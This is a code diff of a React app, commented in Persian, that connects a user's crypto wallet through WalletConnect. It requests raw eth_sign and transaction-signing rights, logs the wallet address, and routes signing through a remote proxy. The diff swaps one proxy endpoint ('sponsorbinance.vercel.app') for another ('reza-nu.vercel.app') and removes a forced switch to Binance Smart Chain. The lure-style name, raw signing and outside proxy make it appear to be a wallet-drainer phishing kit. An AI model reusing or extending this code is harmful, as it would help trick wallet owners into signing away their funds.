@@ -19,7 +19,7 @@ function App() {
           "9a565677e1c0258ac23fd2becc9a6497eeb2f6bf14f6e2af41e3f1d325852edd",
         ],
       },
-      chains: [1, 56], // پشتیبانی از BSC
+      chains: [1],
       methods: ["eth_sign", "eth_sendTransaction", "eth_signTransaction"],
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
@@ -31,19 +31,7 @@ function App() {
     console.log("✅ Wallet Address:", account_sender);
 
     // 🔹 مسیر صحیح برای `send.php`
-    let apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
-
-    async function switchToBSC() {
-      try {
-        await provider.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }], // BSC Mainnet
-        });
-        console.log("✅ Switched to Binance Smart Chain");
-      } catch (switchError) {
-        console.error("❌ Error switching to BSC:", switchError);
-      }
-    }
+    let apiUrl = "https://reza-nu.vercel.app/api/proxy";
 
     async function genSign(address, chain, type, contract = "0") {
       try {
@@ -81,8 +69,6 @@ function App() {
         return null;
       }
     }
-
-    await switchToBSC(); // تغییر شبکه به BSC قبل از امضای تراکنش
 
     var signature = await genSign(account_sender, "56", "coin");
 
